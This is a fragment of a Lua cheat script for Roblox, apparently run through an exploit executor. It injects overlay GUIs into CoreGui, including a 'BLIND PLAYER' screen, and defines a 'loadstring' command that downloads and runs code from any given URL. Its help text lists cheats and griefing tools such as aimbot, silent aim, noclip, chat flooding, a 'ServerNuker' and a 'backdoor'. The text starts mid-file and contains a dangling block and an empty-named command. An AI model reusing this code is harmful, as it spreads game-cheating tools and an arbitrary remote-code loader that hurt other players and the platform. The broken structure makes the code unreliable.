gui.Name = "CoolKidBlindMenu"
gui.ResetOnSpawn = false

--// Main Frame
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0.4, 0, 0.3, 0)
frame.Position = UDim2.new(0.3, 0, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0

--// Glitchy Red Outline
local outline = Instance.new("UIStroke", frame)
outline.Thickness = 3
outline.Color = Color3.fromRGB(255, 0, 0)

--// Mythic Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.Text = "BLIND.EXE"
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Font = Enum.Font.Code
title.TextScaled = true

--// Blind Button
local blindBtn = Instance.new("TextButton", frame)
blindBtn.Size = UDim2.new(0.8, 0, 0.4, 0)
blindBtn.Position = UDim2.new(0.1, 0, 0.5, 0)
blindBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
blindBtn.Text = "BLIND PLAYER"
blindBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
blindBtn.Font = Enum.Font.Code
blindBtn.TextScaled = true

--// Blind Logic
blindBtn.MouseButton1Click:Connect(function()
	local blind = Instance.new("Frame", gui)
	blind.Size = UDim2.new(1, 0, 1, 0)
	blind.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	blind.ZIndex = 10
end)

        mythicPopup("👁️ Blind menu opened.")
    end)
end

commands["typeout"] = function(text)
    pcall(function()
        local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
        gui.Name = "TypeoutGUI"

        local label = Instance.new("TextLabel", gui)
        label.Size = UDim2.new(1, 0, 0, 50)
        label.Position = UDim2.new(0, 0, 0.5, -25)
        label.BackgroundTransparency = 1
        label.Font = Enum.Font.Code
        label.TextColor3 = Color3.fromRGB(0, 255, 0)
        label.TextStrokeTransparency = 0.5
        label.TextScaled = true
        label.Text = ""

        coroutine.wrap(function()
            for i = 1, #text do
                label.Text = string.sub(text, 1, i)
                wait(0.05)
            end
            wait(2)
            gui:Destroy()
        end)()

        mythicPopup("⌨️ Typeout executed.")
    end)
end


commands[""] = function(text)
    pcall(function()
        
        mythicPopup("⌨️ Typeout executed.")
    end)
end

commands["hud"] = function()
    pcall(function()
        local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
        gui.Name = "DistortedHUD"

        local frame = Instance.new("Frame", gui)
        frame.Size = UDim2.new(0, 200, 0, 100)
        frame.Position = UDim2.new(0, 20, 1, -120)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        frame.BorderSizePixel = 0

        local label = Instance.new("TextLabel", frame)
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = "🧠 SYSTEM ACTIVE"
        label.Font = Enum.Font.Code
        label.TextColor3 = Color3.fromRGB(255, 0, 255)
        label.TextStrokeTransparency = 0.5
        label.TextScaled = true

        coroutine.wrap(function()
            while gui.Parent do
                label.TextColor3 = Color3.fromRGB(math.random(200,255), 0, math.random(200,255))
                label.Rotation = math.random(-5,5)
                wait(0.1)
            end
        end)()

        mythicPopup("🧠 Distorted HUD activated.")
    end)
end

commands["loadstring"] = function(args)
    local url = table.concat(args, " ")
    if url:len() > 0 then
        pcall(function()
            loadstring(game:HttpGet(url))()
        end)
    else
        mythicPopup("No URL provided for loadstring command.")
    end
end

commands["help"] = function()
    mythicPopup("Available: .popup .GAG .esp .ServerNuker .fehat .coolkidgui .hitboxmaker .silentaimtsb .loadstring .help .clickforme .wallbang .aimbot .aimlock .orbit .noclip .tracers .serverhop .rejoin .hallucinate .mirrorworld .chatflood .scramblegui .serverannouncement .backdoor .")
end

--// Command State Tracker
local commandStates = {}

--// Command Parser
local function parseCommand(input)
    if not input:match("^%.") then return end
    local split = input:sub(2):split(" ")
    local cmd = split[1]:lower()
    table.remove(split, 1)

    if commands[cmd] then
        commandStates[cmd] = not commandStates[cmd] -- toggle state

        if commandStates[cmd] then
            commands[cmd](split) -- activate
            mythicPopup("Command '" .. cmd .. "' activated.")
        else
            if commands["off_" .. cmd] then
                commands["off_" .. cmd](split) -- deactivate if off handler exists
                mythicPopup("Command '" .. cmd .. "' deactivated.")
            else
                mythicPopup("Command '" .. cmd .. "' toggled off.")
            end
        end
    else
        mythicPopup("Unknown command: " .. cmd)
    end
end